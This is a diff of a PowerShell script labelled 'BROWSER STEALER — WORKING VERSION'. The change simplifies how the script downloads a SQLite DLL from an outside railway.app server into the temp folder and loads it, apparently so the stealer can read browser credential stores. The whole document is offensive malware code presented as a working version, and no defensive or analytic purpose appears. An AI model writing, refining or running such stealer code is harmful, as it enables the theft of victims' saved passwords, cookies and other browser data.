@@ -1,5 +1,6 @@
 # ============================================================
 # BROWSER STEALER — WORKING VERSION
+# Uses Invoke-WebRequest to download DLL
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -24,7 +25,7 @@ Write-Log "============================================"
 Write-Log ""
 
 # ============================================================
-# DOWNLOAD SQLITE DLL FROM YOUR SERVER
+# DOWNLOAD SQLITE DLL USING Invoke-WebRequest
 # ============================================================
 
 $dllPath = "$env:TEMP\System.Data.SQLite.dll"
@@ -37,57 +38,31 @@ if (Test-Path $dllPath) {
 $dllUrl = "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"
 Write-Log "[+] Downloading SQLite DLL from: $dllUrl"
 
-$downloaded = $false
-
-# Try Method 1: WebClient with User-Agent
 try {
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-    $webClient.DownloadFile($dllUrl, $dllPath)
-    if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 50000) {
-        Write-Log "[+] Downloaded successfully (WebClient)"
-        $downloaded = $true
-    }
+    $response = Invoke-WebRequest -Uri $dllUrl -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    [System.IO.File]::WriteAllBytes($dllPath, $response.Content)
+    Write-Log "[+] Downloaded successfully"
 } catch {
-    Write-Log "[!] WebClient failed: $_"
-}
-
-# Try Method 2: Invoke-WebRequest
-if (-not $downloaded) {
-    try {
-        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 50000) {
-            Write-Log "[+] Downloaded successfully (Invoke-WebRequest)"
-            $downloaded = $true
-        }
-    } catch {
-        Write-Log "[!] Invoke-WebRequest failed: $_"
-    }
-}
-
-# Try Method 3: Net.WebClient without headers
-if (-not $downloaded) {
-    try {
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($dllUrl, $dllPath)
-        if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 50000) {
-            Write-Log "[+] Downloaded successfully (no headers)"
-            $downloaded = $true
-        }
-    } catch {
-        Write-Log "[!] Download failed: $_"
-    }
-}
-
-if (-not $downloaded) {
-    Write-Log "[!] Failed to download DLL"
+    Write-Log "[!] Download failed: $_"
     Write-Log "[!] Make sure System.Data.SQLite.dll is in your public folder"
+    Read-Host "Press Enter to exit"
+    exit
+}
+
+if (-not (Test-Path $dllPath)) {
+    Write-Log "[!] DLL not found after download"
     Read-Host "Press Enter to exit"
     exit
 }
 
 $fileSize = (Get-Item $dllPath).Length
 Write-Log "[+] File size: $fileSize bytes"
+
+if ($fileSize -lt 50000) {
+    Write-Log "[!] DLL is too small - not a valid DLL"
+    Read-Host "Press Enter to exit"
+    exit
+}
 
 # ============================================================
 # LOAD SQLITE DLL
